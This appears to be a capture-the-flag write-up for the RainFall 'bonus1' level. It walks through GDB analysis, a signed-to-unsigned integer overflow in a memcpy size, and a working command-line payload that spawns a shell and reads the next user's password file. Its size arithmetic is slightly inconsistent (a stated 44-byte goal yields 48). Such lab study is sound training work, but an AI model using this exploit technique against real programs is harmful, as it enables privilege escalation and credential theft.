@@ -1,0 +1,125 @@
+# Bonus1 - Integer Overflow to Execute Shell
+
+---
+
+# PART 1: Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./bonus1
+Segmentation fault (core dumped)
+
+./bonus1 5
+# No output
+
+./bonus1 5 hello
+# No output
+```
+
+Program needs 2 arguments: a number and a string.
+
+## Step 2: Analyze with GDB
+
+```bash
+gdb bonus1
+(gdb) disas main
+```
+
+**Key findings:**
+- Calls `atoi()` on first argument
+- Checks if result ≤ 9
+- Multiplies result by 4
+- Calls `memcpy(buffer, argv[2], result*4)`
+- Compares value at `esp+0x3c` with `0x574f4c46`
+- If equal → executes `execl("/bin/sh", "sh", 0)`
+
+## Step 3: Understand the memory layout
+
+```gdb
+(gdb) break *main+79
+(gdb) run 5 AAAA
+(gdb) x/20wx $esp
+```
+
+**Memory structure:**
+- Buffer starts at: `esp+0x14`
+- Comparison variable at: `esp+0x3c`
+- Distance: `0x3c - 0x14 = 0x28 = 40 bytes`
+
+## Step 4: Find the magic value
+
+```gdb
+(gdb) x/s 0x8048583
+0x8048583: "/bin/sh"
+
+(gdb) disas main
+   0x08048478 <+84>: cmpl $0x574f4c46,0x3c(%esp)
+```
+
+Need to write `0x574f4c46` at `esp+0x3c`.
+
+In ASCII: `0x46 0x4c 0x4f 0x57` = "FLOW" (little-endian)
+
+## Step 5: Calculate the integer overflow
+
+**Goal:** Copy 44 bytes (40 buffer + 4 magic value)
+
+**Problem:** 
+- `argv[1]` must be ≤ 9
+- `memcpy` size = `argv[1] * 4`
+- `9 * 4 = 36` (not enough!)
+
+**Solution:** Integer overflow with negative numbers
+
+`memcpy` uses `size_t` (unsigned int):
+- Negative number passes check (≤ 9)
+- When multiplied by 4, wraps around to large unsigned value
+
+**Calculation:**
+```
+UINT_MAX = 4294967295
+UINT_MAX / 4 = 1073741823
+
+To get 44 bytes:
+44 = (n * 4) mod 2^32
+44 = (n * 4) mod 4294967296
+
+Try: n = -1073741812
+-1073741812 * 4 = -4294967248
+In unsigned: 4294967296 - 4294967248 = 48 bytes ✓
+```
+
+## Step 6: Verify in GDB
+
+```gdb
+(gdb) run -1073741812 AAAA
+(gdb) break *main+79
+(gdb) info registers ecx
+ecx            0x30    48
+```
+
+Perfect! We get 48 bytes.
+
+## Step 7: Build the payload
+
+```bash
+./bonus1 -1073741812 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+```
+
+**Payload breakdown:**
+- `"A" * 40`: Fill the buffer
+- `\x46\x4c\x4f\x57`: Magic value (FLOW in little-endian)
+
+## Step 8: Execute
+
+```bash
+bonus1@RainFall:~$ ./bonus1 -1073741812 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+[password here]
+```
+
+---
+
